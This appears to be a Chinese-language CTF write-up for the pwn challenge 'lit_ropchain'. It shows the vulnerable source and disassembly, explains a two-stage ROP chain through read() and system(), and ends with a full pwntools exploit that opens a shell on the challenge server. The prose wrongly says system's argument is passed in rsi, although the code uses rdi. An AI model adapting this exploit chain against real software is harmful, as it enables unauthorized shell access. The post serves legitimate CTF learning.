---
title: pwn做题记录：[LitCTF2026] lit_ropchain
date: 2026-07-31
categories: 安全
---

# pwn做题记录：[LitCTF2026] lit_ropchain
**题目链接：https://platform.cyclens.tech/#/challenge/97**
拿到题目附件，查看一下保护
![image](/images/pwn做题记录：LitCTF2026lit_ropchain/img_1.png)

保护只开了一个NX
附件里面给了源码，从源码能看到题目给了一些需要动代码片段，主函数里有栈溢出，偏移0x40+0x8

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char bss_buf[0x100];  // Global buffer in bss section

// Embed ROP gadgets so they exist in the binary
__attribute__((naked, noinline)) void gadget_pop_rdi(void) {
    __asm__ __volatile__("pop %rdi\nret\n");
}
__attribute__((naked, noinline)) void gadget_pop_rsi(void) {
    __asm__ __volatile__("pop %rsi\nret\n");
}
__attribute__((naked, noinline)) void gadget_pop_rdx(void) {
    __asm__ __volatile__("pop %rdx\nret\n");
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void vuln() {
    char buf[64];
    printf("Welcome to the ROP Master challenge!\n");
    printf("Can you chain the pieces together?\n");
    printf("Input: ");
    read(0, buf, 0x200);  // Stack overflow
}

int main() {
    init();
    // Prevent gadgets and system from being optimized away
    volatile void (*fp1)(void) = gadget_pop_rdi;
    volatile void (*fp2)(void) = gadget_pop_rsi;
    volatile void (*fp3)(void) = gadget_pop_rdx;
    volatile int dummy = 0;
    if (dummy) {
        fp1(); fp2(); fp3();
        system("echo hello");
    }
    vuln();
    return 0;
}

```
这里有pop寄存器的gadget，可以设置rdi，rsi和rdx的值，在ida里面也可以看到，在kali里面可以直接利用ROPgadget来找到对应代码段的地址
![image](/images/pwn做题记录：LitCTF2026lit_ropchain/img_2.png)

放到ida里面还能看见程序里面已经准备了system函数，但是**没有“/bin/sh”字符串**

![image](/images/pwn做题记录：LitCTF2026lit_ropchain/img_3.png)

另外还有源码中出现的gadget
*gadget_pop_rdi:*

```
; void __cdecl gadget_pop_rdi()
public gadget_pop_rdi
gadget_pop_rdi proc near
; __unwind {
pop     rdi
retn
gadget_pop_rdi endp ; sp-analysis failed
```
*gadget_pop_rsi:*
```
; void __cdecl gadget_pop_rsi()
public gadget_pop_rsi
gadget_pop_rsi proc near
; __unwind {
pop     rsi
retn
gadget_pop_rsi endp ; sp-analysis failed
```
*gadget_pop_rdx:*
```
; void __cdecl gadget_pop_rdx()
public gadget_pop_rdx
gadget_pop_rdx proc near
; __unwind {
pop     rdx
retn
gadget_pop_rdx endp ; sp-analysis failed
```
在64位程序中，函数被调用时利用寄存器传递参数，这里利用这三个gadget，我们就可以在溢出后调整rdi，rsi和rdx的值，也就是说我们可以调用利用这三个寄存器传参的函数，read函数就符合这个要求。read函数需要三个参数
```
read(int fd, void *buf, size_t count)
```
第一个参数fd是文件描述符，fd=0时会从输入流里读取数据。第二个参数*buf是个指针，指向要写入数据的缓冲区。第三个参数count是读取长度。这三个参数分别由rdi，rsi，rdx传递。
结合之前找到的system函数，不难想到调用read函数向bss段中写入“/bin/sh\x00”字符串，然后再调用system函数拿到shell。system函数只需要一个参数，这个参数用rsi来传递，就是指向“/bin/sh”字符串的指针
我们先在bss段中找一个为止写字符串，利用objdump来找到bss的位置
```
objdump -x ./ropchain

24 .bss          00000140  0000000000403420  0000000000403420  00002408  2**5
                  ALLOC

```
我这里选用bss+0x50的位置写入（具体在哪无所谓，但是都不推荐顶着bss写入）
栈溢出后将rdi设为0，rsi设为bss（payload中的bss就是bss顶部+0x50），rdx设为0x50，然后调用read函数，相当于执行read(0,bss,0x50)。然后再
回到vuln函数进行第二次栈溢出利用
```
payload1=b'a'*offset+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss)+p64(pop_rdx_ret)+p64(0x50)+p64(read)+p64(vuln)

```
发送第一个payload后，向程序发送“/bin/sh\x00”字符串。这里有一个小坑，就是在发送payload后要加一个sleep函数等一下再发送“/bin/sh\x00”字符串，不然发送太快可能会将后面要发送的字符串和前面的payload连在一起发送，read函数还没有被调用字符串就已经被发送了，再到read被调用时就会停下来等待输入，所以要加个sleep等待read函数被调用之后再发送字符串才能达到效果（在这看了半天怀疑我payload写错了(╥﹏╥)）
```
io.recvuntil(b'Input: ')
io.send(payload1)
time.sleep(0.2)                # 防止第一次 read 把 /bin/sh 一起读走
io.send(b'/bin/sh\x00')
```
第二次栈溢出利用就是常规的调用system拿到shell了，之前找到过pop rsi的gadget，直接将rsi设为已经写入“/bin/sh\x00”的bss地址就行。这里要注意一个栈对齐的问题，x86-64 ABI 要求函数入口 rsp ≡ 8 (mod 16) ，直接调用system的rop链到 system@plt 时 rsp ≡ 0 (mod 16)，会导致触发 SIGSEGV 而退出，所以要加上一个ret的gadget将栈对齐，不然无法拿到shell
```
payload2=b'a'*offset+p64(ret)+p64(pop_rdi_ret)+p64(bss)+p64(system)

```
发送即可拿到shell
![image](/images/pwn做题记录：LitCTF2026lit_ropchain/img_4.png)

### 完整脚本代码
```
from pwn import *

#io=process('./ropchain')
io=remote('challenge.cyclens.tech',31639)
elf=ELF('./ropchain')

# gdb.attach(io)

read=elf.sym['read']
vuln=0x004011D6               
system=elf.sym['system']
pop_rdi_ret=0x0000000000401166
pop_rdx_ret=0x0000000000401170
pop_rsi_ret=0x000000000040116b
ret=0x000000000040101a        
offset=0x48                   
bss=0x00000000403420+0x50

payload1=b'a'*offset+p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss)+p64(pop_rdx_ret)+p64(0x50)+p64(read)+p64(vuln)

io.recvuntil(b'Input: ')
io.send(payload1)
time.sleep(0.2)                
io.send(b'/bin/sh\x00')

payload2=b'a'*offset+p64(ret)+p64(pop_rdi_ret)+p64(bss)+p64(system)

io.recvuntil(b'Input: ')
io.send(payload2)

io.interactive()

```